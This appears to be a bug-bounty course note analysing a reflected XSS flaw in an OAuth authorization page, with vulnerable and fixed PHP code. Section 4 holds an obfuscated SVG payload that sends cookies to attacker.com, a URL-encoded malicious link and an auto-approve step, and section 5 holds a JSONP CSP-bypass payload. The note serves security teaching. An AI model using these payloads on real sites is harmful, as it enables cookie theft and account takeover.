---
tags: [bug-bounty, chaining, real-world, vapt]
difficulty: advanced
module: "60 - Advanced Chaining and Real-World Scenarios"
topic: "60.08 Twitter Bug XSS"
---

# 60.08 Twitter Bug: Reflected XSS in OAuth Authorization Flow

## 1. Introduction

Cross-Site Scripting (XSS) remains a pervasive threat, even in the era of modern JavaScript frameworks like React, Vue, and Angular. While these frameworks automatically escape text content, vulnerabilities frequently emerge in complex, legacy, or dynamically generated pages, particularly those interacting with third-party integrations.

One highly instructional real-world scenario involves a vulnerability discovered in a major social media platform's (similar to Twitter's historical bugs) OAuth 2.0 authorization flow. The bug centered around a Reflected XSS vulnerability on the crucial "Authorize App" page—the page where a user grants a third-party application access to their account.

This document analyzes the architecture of the OAuth authorization endpoint, the specific mechanics of the XSS reflection, bypasses for standard XSS filters, and the catastrophic impact of chaining this vulnerability to achieve stealthy account takeover.

## 2. Architecture and Data Flow

The OAuth 2.0 authorization code flow begins when a third-party application redirects a user to the social media platform's authorization endpoint. The URL contains parameters describing the third-party app and where the user should be redirected after granting permission.

### The Attack Flow Diagram

```text
+----------------+                                 +------------------------+
|                |                                 |                        |
|  Attacker      | =======(1) Malicious Link======>|  Victim User           |
|                |                                 |                        |
+----------------+                                 +-----------+------------+
                                                               |
                                                               | (2) Clicks Link
                                                               v
+----------------+                                 +------------------------+
|                |                                 |                        |
|  Attacker Svr  | <======(4) Exfiltrate Token=====|  Twitter OAuth Auth    |
|                |                                 |  Endpoint (/authorize) |
+----------------+                                 +-----------+------------+
                                                               |
                                                               | (3) Reflects Payload
                                                               |     Execution in DOM
                                                               v
                                                   [ XSS Triggered, Token Stolen ]
```

## 3. Vulnerability Mechanics

The vulnerability existed on the `/oauth/authorize` endpoint. A standard, legitimate request looks like this:

`GET /oauth/authorize?client_id=12345&redirect_uri=https://app.com/cb&app_name=AwesomeApp`

When the user visits this URL, the server renders an HTML page displaying:
*"Authorize **AwesomeApp** to access your account?"*

### The Reflection Flaw
The underlying flaw was that the `app_name` parameter (or a similar metadata parameter fetched via the `client_id`) was directly reflected into the HTML Document Object Model (DOM) without proper output encoding or sanitization.

If an attacker registered a malicious third-party application and set the application's name to an XSS payload, or manipulated a vulnerable URL parameter, the server would render the payload verbatim.

### Vulnerable Code Snippet (Conceptual PHP)

```php
<?php
// Vulnerable OAuth Authorization Page
$app_name = $_GET['app_name']; // Unsanitized input
$client_id = $_GET['client_id'];

// FLAW: Directly echoing user-controlled input into the HTML context
echo "<h1>Authorize App</h1>";
echo "<p>Are you sure you want to grant <strong>" . $app_name . "</strong> access to your account?</p>";
echo "<button>Grant Access</button>";
?>
```

If the attacker crafts the URL:
`GET /oauth/authorize?client_id=999&app_name=<script>alert('XSS')</script>`

The server renders:
```html
<p>Are you sure you want to grant <strong><script>alert('XSS')</script></strong> access to your account?</p>
```
The victim's browser parses the `<script>` tag and immediately executes the attacker's JavaScript.

## 4. The Exploit Step-by-Step

Exploiting XSS on an OAuth authorization page is particularly devastating because the page inherently deals with highly sensitive session tokens and permissions.

### Step 1: Payload Construction
The attacker crafts a JavaScript payload designed to bypass basic Web Application Firewalls (WAFs). Since `<script>` tags are often blocked, attackers use event handlers on harmless-looking HTML elements.
Payload: `<svg/onload=eval(atob('ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tL3N0ZWFsP2M9Jytkb2N1bWVudC5jb29raWUp'))>`
(The Base64 decodes to: `fetch('https://attacker.com/steal?c='+document.cookie)`)

### Step 2: Malicious Link Generation
The attacker generates the full OAuth URL containing the payload. To hide the payload, they heavily URL-encode it.
URL: `https://twitter.com/oauth/authorize?client_id=123&app_name=%3Csvg%2Fonload%3Deval%28atob%28%27ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tL3N0ZWFsP2M9Jytkb2N1bWVudC5jb29raWUp%27%29%29%3E`

### Step 3: Delivery via Social Engineering
The attacker sends the link to the victim (e.g., via a Direct Message or a malicious tweet disguised as a news article).

### Step 4: Execution and Escalation
1. The victim, already logged into their account, clicks the link.
2. The browser navigates to the official `/oauth/authorize` endpoint.
3. The server reflects the payload into the page.
4. The browser executes the payload.
5. **The Escalation:** Instead of just stealing a cookie (which might be protected by the `HttpOnly` flag), an advanced attacker will script the payload to automatically click the "Grant Access" button via DOM manipulation (`document.getElementById('grant-btn').click()`).
6. The victim's account silently grants full read/write access to the attacker's malicious third-party OAuth application. The attacker now has persistent control over the victim's account via the OAuth API, even if the victim changes their password.

## 5. Advanced Bypasses: Defeating Content Security Policy (CSP)

Modern platforms employ Content Security Policy (CSP) to mitigate XSS by restricting where scripts can be loaded from and preventing inline script execution. A strict CSP might look like:
`Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;`

If the platform utilizes an insecure JSONP endpoint or hosts an outdated JavaScript library on `trusted-cdn.com`, the attacker can bypass the CSP.

### CSP Bypass Example (JSONP)
If `trusted-cdn.com` hosts a JSONP endpoint like `https://trusted-cdn.com/api/user?callback=`, the attacker can inject a script tag that loads from the trusted domain but executes arbitrary JavaScript via the callback parameter.

Payload: `<script src="https://trusted-cdn.com/api/user?callback=alert('XSS Bypass')"></script>`

Because the script originates from `trusted-cdn.com`, the CSP allows it to load, but the payload executes the attacker's code.

## 6. Real-World Consequences

An XSS vulnerability on a sensitive endpoint like OAuth authorization bypasses the traditional "user interaction" requirement of OAuth. It converts a standard Reflected XSS into a one-click, persistent Account Takeover (ATO) vector. Worms (like the infamous Samy worm on MySpace) frequently utilize these exact types of chained vulnerabilities to spread exponentially across a platform.

## 7. Secure Coding and Remediation

### 1. Strict Output Encoding
The fundamental remediation for Reflected XSS is context-aware output encoding. Before any user-controlled data is inserted into an HTML document, it must be encoded according to where it is being placed (HTML body, JavaScript variable, CSS, or URL).

**Secure Code Snippet (PHP with `htmlspecialchars`)**
```php
<?php
// Secure implementation
$app_name = $_GET['app_name'];

// htmlspecialchars converts special characters to HTML entities
// e.g., < becomes &lt;, > becomes &gt;, " becomes &quot;
$safe_app_name = htmlspecialchars($app_name, ENT_QUOTES, 'UTF-8');

echo "<h1>Authorize App</h1>";
echo "<p>Are you sure you want to grant <strong>" . $safe_app_name . "</strong> access?</p>";
?>
```

### 2. Implementation of Strict CSP
Implement a strict Content Security Policy that strictly forbids inline scripts (`unsafe-inline`) and utilizes cryptographic nonces for all legitimate script tags.
`Content-Security-Policy: script-src 'nonce-rAnd0m123' 'strict-dynamic';`

### 3. Separation of OAuth Data
Avoid passing display parameters like `app_name` directly in the URL. Instead, the backend should securely look up the `app_name` from the database using the provided `client_id`. This entirely removes the user's ability to arbitrarily manipulate the displayed text.

## 8. Chaining Opportunities

- **XSS + CSRF (OAuth Approval):** As demonstrated, using the XSS execution context to generate a silent POST request that approves the OAuth application, bypassing anti-CSRF tokens because the JavaScript executes within the authenticated context.
- **XSS + Session Fixation:** Using the XSS payload to force a specific session cookie onto the victim's browser, allowing the attacker to log in as the victim.

## 9. Related Notes

- [[02 - Cross-Site Scripting (XSS) Deep Dive]]
- [[05 - OAuth 2.0 Security and Exploitation]]
- [[13 - Bypassing Content Security Policy (CSP)]]
- [[06 - HackerOne Disclosed Reports Top 10]]
